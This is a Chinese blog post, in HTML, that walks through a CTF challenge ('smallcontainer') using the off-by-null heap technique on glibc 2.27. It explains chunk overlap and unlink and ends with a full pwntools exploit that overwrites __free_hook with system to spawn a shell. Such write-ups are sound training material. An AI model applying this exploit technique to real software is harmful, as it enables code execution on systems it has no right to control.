@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>off_by_null | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="off by null其实是off by one的一种特殊形式。也就是我们能溢出size的最低一位字节，但是只能改写为\x00。 我们知道size的最低一字节是标志位P。它以为这我们能判断前一个堆块是否处于利用中。如果从1改写为0，那么就可以通过unlink的手法来达到一些意想不到的结果。 [巅峰极客 2022]smallcontainer版本是：2.27-3ubuntu1.5_amd64。这个时">
+<meta property="og:type" content="website">
+<meta property="og:title" content="off_by_null">
+<meta property="og:url" content="http://example.com/2026/02/23/off-by-null/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="off by null其实是off by one的一种特殊形式。也就是我们能溢出size的最低一位字节，但是只能改写为\x00。 我们知道size的最低一字节是标志位P。它以为这我们能判断前一个堆块是否处于利用中。如果从1改写为0，那么就可以通过unlink的手法来达到一些意想不到的结果。 [巅峰极客 2022]smallcontainer版本是：2.27-3ubuntu1.5_amd64。这个时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-02-23T15:22:08.000Z">
+<meta property="article:modified_time" content="2026-02-23T16:21:21.122Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn进阶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/02/23/off-by-null/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'off_by_null',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">off_by_null</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h1><p>其实是off by one的一种特殊形式。也就是我们能溢出size的最低一位字节，但是只能改写为\x00。</p>
+<p>我们知道size的最低一字节是标志位P。它以为这我们能判断前一个堆块是否处于利用中。如果从1改写为0，那么就可以通过unlink的手法来达到一些意想不到的结果。</p>
+<h2 id="巅峰极客-2022-smallcontainer"><a href="#巅峰极客-2022-smallcontainer" class="headerlink" title="[巅峰极客 2022]smallcontainer"></a><code>[巅峰极客 2022]smallcontainer</code></h2><p>版本是：2.27-3ubuntu1.5_amd64。这个时候unlink还没有打开检查size的保护。所以还会简单一些。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    n5 = retnum();</span><br><span class="line">    <span class="keyword">if</span> ( n5 == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n5 &gt; <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">switch</span> ( n5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还是正常的菜单函数。同时这里的delete函数还没有uaf漏洞。（但是通过chunk overlap，我们可以做到一个类似于uaf的效果。）</p>
+<p>这里的漏洞存在于check()。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n0x10; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input index: &quot;</span>);</span><br><span class="line">  n0x10 = retnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &gt; <span class="number">0x10</span> || !heappp[n0x10] || !sizeee[n0x10] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)heappp[n0x10], sizeee[n0x10]);</span><br><span class="line">  <span class="keyword">return</span> check((_BYTE *)heappp[n0x10]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)*a1;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">0x11</span> )</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来我们写入的内容会进行一次check。当遇到空（0）时停止。在停止之前读到的\x11字节都会改写为\x00。那么这里就存在off by null的漏洞了。如果我们申请一个0x210的chunk。并且前一个堆块在利用中。那么此时size的后三字节就会是0x211。当前一个chunk被填满不为0的字节后，就会改0x211为0x200了。此时可以触发unlink了。</p>
+<p>然后再通过改写__free_hook为system来getshell。</p>
+<p>首先是去泄露libc基地址。还是先去填满tcache bins。由于这里不存在uaf的漏洞。所以我们可以通过先将一个较大的堆块释放到unsorted bin管理。再对半砍。此时前半的user data会被写入fd和bk。也就是main_arena的真实地址。那么也就做到了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x250</span>) <span class="comment">#0~8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment">#0~7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x250</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#8 这里是为了清空unsorted bin，恢复堆环境</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x3ebef0</span></span><br></pre></td></tr></table></figure>
+
+<p>而这也就仅仅只是第一步。后面就开始了我们精心计算的环节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x1f0</span>) <span class="comment">#0x200-0x10=0x1f0</span></span><br><span class="line">add (<span class="number">0x108</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment">#10  avoid top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment"># 0~7</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x100</span>+p16(<span class="number">0x310</span>))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x121</span>)) <span class="comment">#0x210+0x110-0x200=0x120 (P=1)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里先是把我们之前申请的chunk给全部释放。然后去申请了大小为0x200的chunk去填满tcache bins。注意，此时idx &#x3D; 7的chunk会被分配到unsorted bin中。这是我们后面计算的一个要点。</p>
+<p>然后我们又去申请了三个chunk。其中chunk 8是为了unlink利用。chunk 9是为了off by bull利用。chunk 10则是为了防止合并。</p>
+<p>首先我们要知道在64位程序下，我们申请的chunk会按照16字节对齐。也就是说当我们申请0x200和0x208大小的chunk时，实际上系统都会给我们分配0x210大小的chunk。而申请0x208也是我们进行off by null的关键。不然当我们申请0x200大小的chunk会有8字节是我们无法写入的，也就是浪费的。也改不了chunk 9的标志位，没有了unlink可以利用。</p>
+<p>其次，这里的三次edit也很关键。</p>
+<p>第一次把chunk 8填满。也就是这里修改chunk 9标志位的关键。可以看下现在chunk 9的size应该为0x200。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x55555555d6c0:	0x0000000000000310	0x0000000000000200</span><br></pre></td></tr></table></figure>
+
+<p>而这里的0x310也是我们改写的。</p>
+<p>首先由于内存分配管理的问题<code>0x55555555d6c0</code>为首地址的8字节不仅是9的pre_size位，也是8的user_data。也就是说，当我们去unlink的时候，系统会根据chunk 9（freed）的pre_size去找堆块。那这里为什么是0x310呢？</p>
+<p>还记得我们之前的idx &#x3D; 7的chunk吗？加上header大小是0x200。chunk 8加上header的大小是0x110。0x200+0x110 &#x3D; 0x310。也就是说7 ，8 ，9三个chunk会一块合并。合并成一个0x200 + 0x110 + 0x200 &#x3D; 0x510的巨大chunk。那么此时free 9后就会归类在unsorted bin中。但是8没有被free。我们可以合法访问。简直不要太神奇。</p>
+<p>这里第三次edit是为什么呢？</p>
+<p>由于我们free 9的时候，系统不仅会向前合并，还会向后合并。也就是说系统会去检查chunk 10的标志位是否为0。所以这个时候我们需要自己来伪造一个header来让系统了解，这里的标志位为1，然后放松对我们unlink的检查。</p>
+<p>至于大小为什么是0x120呢？</p>
+<p>是因为我们chunk 9的原本的大小是0x210,chunk 10是0x110。那么距离top chunk的大小是0x210 + 0x110 &#x3D; 0x320。但是根据我们off by null的改变后，chunk 9 size &#x3D; 0x200，此时距离chunk 10 实际距离top chunk就应该等于0x320 - 0x200 &#x3D; 0x120。至于这里padding的长度则是由0x208 - 0x10 &#x3D; 0x1f8得到的。</p>
+<p>当我们完成上面的布局后。去free 9 。此时就会得到一个0x510大小的chunk。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d3b0</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line">fd: 0x7ffff7bebca0</span><br><span class="line">bk: 0x7ffff7bebca0</span><br></pre></td></tr></table></figure>
+
+<p>下面就是unlink的打法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">debug()</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment">#7 + 8 =0x310 idx = 0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(free_hook)) <span class="comment">#8 fd = free_hook</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(sys))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>通过free堆块来使count++。然后我们去申请了一个大小为0x300的chunk。还记得被困在7和9之间的chunk 8 吗？这里的目的就是去改8的fd为free_hook，也就是类似uaf的手法。后面就不过多赘述了。</p>
+<p>下面给出完整的exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,25551)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x250</span>) <span class="comment">#0~8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment">#0~7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x250</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#8</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x3ebef0</span></span><br><span class="line">free_hook = base + libc.sym.__free_hook</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x1f0</span>) <span class="comment">#0x200-0x10=0x1f0</span></span><br><span class="line">add (<span class="number">0x108</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment">#10  avoid top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment"># 0~7</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x100</span>+p16(<span class="number">0x310</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x121</span>)) <span class="comment">#0x210+0x110-0x200=0x120 (P=1)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">debug()</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment">#7 + 8 =0x310 idx = 0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(free_hook)) <span class="comment">#8 fd = free_hook</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(sys))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/02/23/off-by-null/">http://example.com/2026/02/23/off-by-null/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn%E8%BF%9B%E9%98%B6/">pwn进阶</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/19/Double-free/" title="Double_free"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div 